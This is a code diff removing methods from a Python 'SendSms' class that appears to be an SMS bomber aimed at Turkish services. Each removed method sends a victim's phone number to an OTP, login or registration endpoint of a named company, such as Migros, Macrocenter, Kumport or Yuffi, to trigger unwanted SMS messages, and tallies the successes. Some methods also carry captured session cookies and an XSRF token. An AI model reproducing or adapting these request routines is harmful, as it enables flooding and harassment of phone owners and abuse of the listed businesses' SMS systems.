@@ -55,19 +55,7 @@ class SendSms():
 
     
 
-    #mopas.com.tr
-    def Mopas(self):
-        try:
-            cookies = {"JSESSIONID": "6817377124C666AA59F3E6B0678F124C"}
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=", cookies=cookies, headers=headers)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
+
             
 
  
@@ -202,20 +190,6 @@ class SendSms():
     
 
 
-    #macrocenter.com.tr
-    def Macro(self):
-        try:
-            url = "https://rest.macrocenter.com.tr:443/users/login/otp"
-            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS", "X-Request-Identifier": "2C1B6BBB-3E1E-4E7E-9CAE-990C6EAAD279", "Accept": "*/*", "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "2.3.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "Macrocenter/15 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Identifier": "C7CF9525-9BEB-47B0-87EF-FAFA9F778C3E", "X-Device-Latitude": "", "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
-            json={"phoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.macrocenter.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.macrocenter.com.tr")
 
 
     #tiklagelsin.com
@@ -297,23 +271,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
 
 
-   
-
-
-    #pisir.com
-    def Pisir(self):
-        try:
-            url = "https://api.pisir.com:443/v1/login/"
-            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Pisir/386 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
-            json={"app_build": "386", "app_platform": "ios", "msisdn": f"+90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["ok"] == "1":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
 
 
     #hizliecza.com.tr
@@ -364,19 +321,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")
 
 
-    #kumport.com.tr
-    def Kumport(self):
-        try:
-            url = f"https://online.kumport.com.tr:443/Api/Client/CallApi?action=kumport/User/SendSmsCodeToUser?phoneNumber={self.phone}_AND_ip="
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Xsrf-Token": "dLW-gyiEuXVAX42kxdgccFjrCuCklM_ZqvwfzTtUEinJ5QA_54MJ4jI71JG_YzEgzNWtKtRuIB9OmCWiz4QKvTlO-FDTsPwS2tYpG4AxPno1", "Dnt": "1", "Referer": "https://online.kumport.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            r = requests.get(url, headers=headers, verify=False)
-            if r.text.replace("\"", "").split(",")[1].split(":")[1].lower() == "true":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> online.kumport.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> online.kumport.com.tr")
 
     
     #qumpara.com
@@ -411,20 +355,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")
 
         
-    #migros.com.tr
-    def Migros(self):
-        try:
-            url = "https://rest.migros.com.tr:443/hemen/users/login/otp"
-            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS", "X-Request-Identifier": "6059F027-F6BC-41A9-93E6-77FB388DA19B", "Accept": "*/*", "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "10.5.2", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "Migros/1690 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Identifier": "DA391FD6-7299-4A4E-A35E-1D3090547582", "X-Device-Latitude": "", "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
-            json={"phoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
 
 
     #file.com.tr
@@ -443,20 +373,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
 
 
-    #roombadi.com
-    def Roombadi(self):
-        try:
-            url = "https://api.roombadi.com:443/api/v2/auth/otp/authenticate"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "Roombadi/3 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en,tr"}
-            json={"countryId": 2, "phone": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["remainingTime"] == 120:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.roombadi.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")
 
     
     
@@ -507,19 +423,7 @@ class SendSms():
     
 
     
-    #taksim.digital
-    def Taksim(self):
-        try:
-            url = "https://service.taksim.digital/services/PassengerRegister/Register"
-            json= {"countryPhoneCode": "+90","phoneNo": self.phone}
-            r = requests.post(url=url, json=json)
-            if r.json()["success"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
+
     
     
     #vakiftasdelensu.com
@@ -555,35 +459,9 @@ class SendSms():
    
     
 
-    #unilever.com.tr
-    def Unilever(self):
-        try:
-            url = "https://www.siparisdirekt.com/customer/otp/sendotp"
-            data = {"mobile": self.phone, "prefix": "+90"}
-            headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}
-            r = requests.post(url=url, headers=headers, data=data)
-            if r.json()["status"] == 1:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> siparisdirekt.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> siparisdirekt.com")
 
 
-    #uysalmarket.com.tr
-    def Uysal(self):
-        try:
-            url = "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms"
-            json = {"phone_number": self.phone}
-            r = requests.post(url=url, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
+
     
     
     
@@ -592,17 +470,5 @@ class SendSms():
    
     
     
-    #yuffi.co
-    def Yuffi(self):
-        try:
-            url = "https://api.yuffi.co/api/parent/login/user"
-            json = {"phone": self.phone, "kvkk": True}
-            r = requests.post(url, json=json)
-            if r.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
+
             
